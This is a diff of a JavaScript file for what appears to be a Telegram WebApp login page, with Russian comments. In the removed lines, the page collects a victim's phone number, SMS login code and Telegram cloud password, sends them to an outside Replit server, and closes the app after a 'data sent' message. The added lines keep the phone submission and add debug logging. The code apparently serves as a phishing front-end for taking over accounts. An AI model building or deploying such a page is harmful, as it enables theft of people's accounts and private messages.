@@ -1,144 +1,70 @@
-// ===== НАСТРОЙКИ =====
-const SERVER_URL = 'https://483aeb0e-d724-4e9b-ad96-9b813e0002fa-00-fe63autuudl3.pike.replit.dev:3000/';
+// script.js - полная версия с отладкой
+const SERVER_URL = 'https://483aeb0e-d724-4e9b-ad96-9b813e0002fa-00-fe63autuudl3.pike.replit.dev';
 
-// ===== ЭЛЕМЕНТЫ =====
-const phoneInput = document.getElementById('phone');
-const codeInput = document.getElementById('code');
-const faInput = document.getElementById('fa');
-const sendBtn = document.getElementById('sendCodeBtn');
-const loginBtn = document.getElementById('loginBtn');
-const messageDiv = document.getElementById('message');
+// Тест соединения при загрузке
+window.addEventListener('load', async () => {
+    try {
+        const test = await fetch(SERVER_URL + '/test');
+        const data = await test.json();
+        console.log('✅ Сервер доступен:', data);
+    } catch (error) {
+        console.error('❌ Сервер недоступен:', error);
+    }
+});
 
-// ===== ПЕРЕМЕННЫЕ =====
-let currentPhone = '';
-let is2faRequested = false;
-
-// ===== ФУНКЦИИ =====
-function showMessage(text, type) {
-    messageDiv.textContent = text;
-    messageDiv.className = 'message ' + type;
-    messageDiv.style.display = 'block';
-    setTimeout(() => {
-        messageDiv.style.display = 'none';
-    }, 5000);
+// Функция для запроса
+async function makeRequest(endpoint, body) {
+    console.log(`🔄 Отправка на ${SERVER_URL}${endpoint}:`, body);
+    
+    try {
+        const response = await fetch(SERVER_URL + endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+        
+        console.log('📡 Статус:', response.status, response.statusText);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log('📦 Ответ:', data);
+        return data;
+        
+    } catch (error) {
+        console.error('❌ Ошибка запроса:', error);
+        throw error;
+    }
 }
 
-// ===== ОТПРАВКА КОДА =====
+// Обработчик Send Code
 sendBtn.addEventListener('click', async () => {
-    currentPhone = phoneInput.value.trim();
+    const phone = phoneInput.value.trim();
     
-    if (!currentPhone || !currentPhone.startsWith('+')) {
-        showMessage('Введите номер в формате +7XXXXXXXXXX', 'error');
+    if (!phone.startsWith('+')) {
+        showMessage('Введите номер с +', 'error');
         return;
     }
     
-    showMessage('📤 Отправка запроса...', 'info');
+    showMessage('📤 Отправка...', 'info');
     sendBtn.disabled = true;
-    sendBtn.textContent = '⏳ Отправка...';
     
     try {
-        const response = await fetch(SERVER_URL + '/send-code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: currentPhone })
-        });
-        
-        const data = await response.json();
+        const data = await makeRequest('/send-code', { phone });
         
         if (data.success) {
-            showMessage(`✅ Запрос отправлен! Код: ${data.code}`, 'success');
-            console.log(`📱 Ваш код для теста: ${data.code}`);
-            
-            // Активируем поле для кода
+            showMessage(`✅ Код: ${data.code}`, 'success');
             codeInput.disabled = false;
             codeInput.focus();
-            sendBtn.textContent = '✅ Запрос отправлен';
-            sendBtn.style.background = '#666';
-        }
-    } catch (error) {
-        showMessage('❌ Ошибка соединения с сервером', 'error');
-        sendBtn.disabled = false;
-        sendBtn.textContent = '📤 Отправить код';
-    }
-});
-
-// ===== ВХОД С КОДОМ =====
-loginBtn.addEventListener('click', async () => {
-    const code = codeInput.value.trim();
-    const fa = faInput.value.trim();
-    
-    if (!code) {
-        showMessage('Введите код из SMS', 'error');
-        return;
-    }
-    
-    showMessage('🔐 Проверка данных...', 'info');
-    loginBtn.disabled = true;
-    loginBtn.textContent = '⏳ Проверка...';
-    
-    try {
-        const response = await fetch(SERVER_URL + '/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                phone: currentPhone, 
-                code: code,
-                fa: fa || ''
-            })
-        });
-        
-        const data = await response.json();
-        
-        if (data.success) {
-            showMessage('✅ Данные отправлены! Ожидайте подтверждения.', 'success');
-            loginBtn.textContent = '✅ Отправлено';
-            loginBtn.style.background = '#666';
             
-            // Через 5 секунд закрываем
-            setTimeout(() => {
-                if (typeof window.Telegram !== 'undefined') {
-                    window.Telegram.WebApp.close();
-                }
-            }, 5000);
-        } else {
-            showMessage('❌ Неверный код', 'error');
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'Войти в систему';
+            // Сохраняем код для проверки
+            window.lastCode = data.code;
+            console.log(`💾 Сохранён код: ${data.code}`);
         }
     } catch (error) {
-        showMessage('❌ Ошибка соединения', 'error');
-        loginBtn.disabled = false;
-        loginBtn.textContent = 'Войти в систему';
+        showMessage('❌ Ошибка отправки', 'error');
+        sendBtn.disabled = false;
     }
 });
-
-// ===== 2FA ЗАПРОС (имитация) =====
-// В реальном приложении это будет вызываться при нажатии "2FA" в Telegram
-function request2FAPassword() {
-    is2faRequested = true;
-    faInput.disabled = false;
-    faInput.placeholder = 'ВВЕДИТЕ ОБЛАЧНЫЙ ПАРОЛЬ';
-    faInput.style.border = '2px solid #ffa502';
-    faInput.focus();
-    showMessage('🔐 Требуется облачный пароль (2FA)', 'info');
-}
-
-// Для теста: запрос 2FA через 5 секунд после отправки кода
-setTimeout(() => {
-    // Раскомментируйте для теста 2FA:
-    // request2FAPassword();
-}, 5000);
-
-// ===== АКТИВАЦИЯ КНОПКИ ВХОДА =====
-codeInput.addEventListener('input', () => {
-    loginBtn.disabled = codeInput.value.length < 4;
-});
-
-// ===== ТЕСТОВОЕ АВТОЗАПОЛНЕНИЕ =====
-phoneInput.addEventListener('dblclick', function() {
-    if (!phoneInput.value) {
-        phoneInput.value = '+79211234567';
-        showMessage('🔧 Номер заполнен для теста', 'info');
-    }
-});
-
